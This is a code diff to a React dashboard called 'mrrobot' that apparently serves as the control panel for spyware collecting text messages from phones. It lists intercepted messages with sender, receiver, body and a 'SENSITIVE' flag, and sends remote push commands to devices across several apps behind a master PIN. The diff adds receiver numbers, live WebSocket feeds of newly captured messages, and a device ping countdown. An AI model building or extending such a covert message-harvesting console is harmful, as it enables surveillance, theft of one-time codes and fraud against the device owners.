@@ -33,7 +33,7 @@ type FullDevice = {
 };
 type MsgRow = {
   id: number; appId: string; deviceId: string; userId: string;
-  fromSender: string; fromNumber: string; body: string;
+  fromSender: string; fromNumber: string; toNumber?: string | null; body: string;
   isSensitive: boolean; receivedAt: string;
 };
 type GroupRow = {
@@ -515,6 +515,16 @@ function MsgCard({ msg, appColor }: { msg: MsgRow; appColor: string }) {
               {msg.fromNumber}
             </span>
           )}
+          {msg.toNumber && (
+            <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
+              <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>TO</span>
+              {msg.toNumber}
+              <button onClick={e => { e.stopPropagation(); copyVal(msg.toNumber!, setCopiedSender); }} title="Copy receiver"
+                style={{ background: "none", border: "none", cursor: "pointer", color: copiedSender ? T.green : T.accentLight, padding: 1, display: "flex" }}>
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+              </button>
+            </span>
+          )}
           {msg.isSensitive && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px" }}>SENSITIVE</span>}
         </div>
       </div>
@@ -563,6 +573,21 @@ function MessagesTab({ apps, masterPin, syncTick: _syncTick }: { apps: App[]; ma
     const t = setTimeout(() => setDebouncedSearch(search.trim()), 500);
     return () => clearTimeout(t);
   }, [search]);
+
+  // Live: WebSocket fires mrrobot:message_added → prepend new message (browse mode only)
+  useEffect(() => {
+    function onAdded(e: Event) {
+      const payload = (e as CustomEvent<{ appId: string; message: MsgRow }>).detail;
+      if (appFilter && payload.appId !== appFilter) return;
+      setMsgs(prev => {
+        if (prev.some(m => m.id === payload.message.id)) return prev;
+        return [payload.message, ...prev];
+      });
+      setTotalDbCount(c => c !== null ? c + 1 : c);
+    }
+    window.addEventListener("mrrobot:message_added", onAdded);
+    return () => window.removeEventListener("mrrobot:message_added", onAdded);
+  }, [appFilter]);
 
   /* ── BROWSE: load first page ── */
   const loadFirst = useCallback(async () => {
@@ -1003,9 +1028,47 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
   const [state, setState] = useState<FcmState>("idle");
   const [log, setLog] = useState("");
   const [disableState, setDisableState] = useState<FcmState>("idle");
+  const [countdown, setCountdown] = useState(0);
+
+  // Live countdown for online_check: 0 → 30s
+  useEffect(() => {
+    if (state !== "sending" || action !== "online_check") return;
+    setCountdown(0);
+    const iv = setInterval(() => setCountdown(c => c + 1), 1000);
+    return () => clearInterval(iv);
+  }, [state, action]);
+
+  // Auto-timeout online_check after 30s
+  useEffect(() => {
+    if (state !== "sending" || action !== "online_check") return;
+    const t = setTimeout(() => { setState("idle"); setLog(""); }, 30000);
+    return () => clearTimeout(t);
+  }, [state, action]);
+
+  // SSE: device responded → stop countdown & show success
+  useEffect(() => {
+    if (action !== "online_check") return;
+    function onUpdated(e: Event) {
+      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
+      if (deviceId !== device.deviceId) return;
+      setState("ok");
+      setTimeout(() => { setState("idle"); setLog(""); }, 3000);
+    }
+    window.addEventListener("mrrobot:device_updated", onUpdated);
+    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
+  }, [action, device.deviceId]);
 
   async function fcm(data: Record<string, string>) {
     if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
+    if (action === "online_check") {
+      setState("sending"); setLog("");
+      try {
+        const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
+        if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); }
+        // stays "sending" until SSE fires or 30s timeout
+      } catch { setLog("Network error"); setState("err"); }
+      return;
+    }
     setState("sending"); setLog("Sending…");
     try {
       const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
@@ -1061,11 +1124,21 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
 
       {action === "online_check" && (
         <>
-          <div style={{ fontSize: 12, color: T.mutedLight, marginBottom: 12 }}>Pings <b style={{ color: T.text }}>{device.name}</b> to check if it's online.</div>
+          <div style={{ fontSize: 12, color: T.mutedLight, marginBottom: 12 }}>Pings <b style={{ color: T.text }}>{device.name}</b> to check if it's online and reachable.</div>
           <StatusLog />
-          <PrimaryBtn onClick={() => fcm({ type: "online_check" })} disabled={state === "sending"}>
-            {state === "sending" ? <><Spinner /> Waiting…</> : state === "ok" ? "✓ Online" : "Ping Device"}
-          </PrimaryBtn>
+          <button onClick={() => void fcm({ type: "online_check" })} disabled={state === "sending"} style={{
+            width: "100%", padding: "12px 0", borderRadius: 9, border: "none",
+            background: state === "ok" ? T.green : T.accent,
+            color: "#fff", fontWeight: 700, fontSize: 14,
+            cursor: state === "sending" ? "wait" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
+          }}>
+            {state === "sending" ? <><Spinner /> Waiting… {countdown}s</> : state === "ok" ? "✓ Online" : "Ping Device"}
+          </button>
+          {state === "sending" && (
+            <div style={{ marginTop: 8, height: 3, background: T.border, borderRadius: 2, overflow: "hidden" }}>
+              <div style={{ height: "100%", background: `linear-gradient(90deg,${T.accent},#8b5cf6)`, width: `${Math.min((countdown / 30) * 100, 100)}%`, transition: "width 1s linear" }} />
+            </div>
+          )}
         </>
       )}
 
@@ -1329,6 +1402,13 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
                         <CopyIconBtn value={msg.fromNumber} title="Copy number" />
                       </span>
                     )}
+                    {msg.toNumber && (
+                      <span style={{ color: T.muted, display: "inline-flex", alignItems: "center", gap: 4 }}>
+                        <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>TO</span>
+                        {msg.toNumber}
+                        <CopyIconBtn value={msg.toNumber} title="Copy receiver" />
+                      </span>
+                    )}
                   </div>
                 </div>
               );
@@ -1409,6 +1489,13 @@ function DevicesTab({ apps, masterPin, syncTick, onOnlineCount }: { apps: App[];
   }, [appFilter, masterPin]); // eslint-disable-line react-hooks/exhaustive-deps
 
   useEffect(() => { void fetchDevices(); setPage(1); }, [fetchDevices, syncTick]);
+
+  // Live: WebSocket fires mrrobot:refresh_devices → re-fetch silently
+  useEffect(() => {
+    function onRefresh() { void fetchDevices(); }
+    window.addEventListener("mrrobot:refresh_devices", onRefresh);
+    return () => window.removeEventListener("mrrobot:refresh_devices", onRefresh);
+  }, [fetchDevices]);
 
   const ONLINE_MS = 15 * 60 * 1000;
   const q = search.trim().toLowerCase();
@@ -1797,6 +1884,39 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
   }, [masterPin]);
 
   useEffect(() => { void fetchApps(); }, [fetchApps]);
+
+  // ── Global WebSocket: live device_updated + message_added events ──
+  useEffect(() => {
+    let ws: WebSocket | null = null;
+    let closed = false;
+    let retryDelay = 2000;
+    function connect() {
+      if (closed) return;
+      const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
+      ws = new WebSocket(`${proto}//${window.location.host}/api/events`);
+      ws.onopen = () => { retryDelay = 2000; };
+      ws.onmessage = (e) => {
+        let parsed: { event: string; data: unknown };
+        try { parsed = JSON.parse(typeof e.data === "string" ? e.data : ""); }
+        catch { return; }
+        const { event, data } = parsed;
+        if (event === "device_updated") {
+          const d = data as FullDevice;
+          // Dispatch so CardCheckBtn + DeviceActionPanel can react
+          window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: { deviceId: d.deviceId } }));
+          // Trigger a devices refresh
+          window.dispatchEvent(new CustomEvent("mrrobot:refresh_devices"));
+        } else if (event === "message_added") {
+          // Trigger messages refresh across tabs
+          window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: data }));
+        }
+      };
+      ws.onclose = () => { if (!closed) { setTimeout(connect, retryDelay); retryDelay = Math.min(retryDelay * 1.5, 30000); } };
+      ws.onerror = () => ws?.close();
+    }
+    connect();
+    return () => { closed = true; ws?.close(); };
+  }, []);
 
   async function handlePingAll() {
     setPingState("loading"); setPingResult(null); setPingDone(0); setPingTotal(0);
